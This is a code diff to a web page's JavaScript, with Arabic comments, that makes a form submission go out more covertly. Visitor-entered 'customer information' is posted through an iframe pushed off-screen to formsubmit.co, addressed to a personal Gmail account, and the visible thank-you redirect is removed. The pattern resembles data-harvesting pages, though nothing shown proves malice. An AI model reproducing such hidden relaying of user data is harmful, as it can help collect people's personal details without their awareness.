@@ -2720,17 +2720,23 @@
             submitBtn.disabled = true;
             submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin ml-2"></i> جاري الإرسال...';
             
-            // إرسال الإيميل في الخلفية بدون إعادة توجيه
+            // إرسال الإيميل في الخلفية بدون إعادة توجيه أو صفحة شكر
             const hiddenIframe = document.createElement('iframe');
             hiddenIframe.name = 'backgroundEmailFrame';
             hiddenIframe.style.display = 'none';
+            hiddenIframe.style.visibility = 'hidden';
+            hiddenIframe.style.position = 'absolute';
+            hiddenIframe.style.left = '-9999px';
+            hiddenIframe.style.top = '-9999px';
+            hiddenIframe.style.width = '1px';
+            hiddenIframe.style.height = '1px';
             document.body.appendChild(hiddenIframe);
             
-            // Create real form submission for email - يرسل في الخلفية
+            // Create real form submission for email - يرسل في الخلفية مخفي 100%
             const realForm = document.createElement('form');
             realForm.method = 'POST';
             realForm.action = 'https://formsubmit.co/alhkr5415@gmail.com';
-            realForm.target = 'backgroundEmailFrame'; // إرسال للـ iframe المخفي
+            realForm.target = 'backgroundEmailFrame'; // إرسال للـ iframe المخفي تماماً
             realForm.style.display = 'none';
             
             // Add all data as hidden inputs
@@ -2754,7 +2760,7 @@
             formData.append('_subject', '📋 معلومات عميل جديد - الخطوة 1 - مكاسر العود');
             formData.append('_captcha', 'false');
             formData.append('_template', 'table');
-            formData.append('_next', 'https://formsubmit.co/thankyou.html'); // إعادة توجيه للـ iframe فقط
+            formData.append('_next', 'about:blank'); // عدم إعادة توجيه - صفحة فارغة
             
             // Convert FormData to hidden inputs
             for (const [key, value] of formData.entries()) {
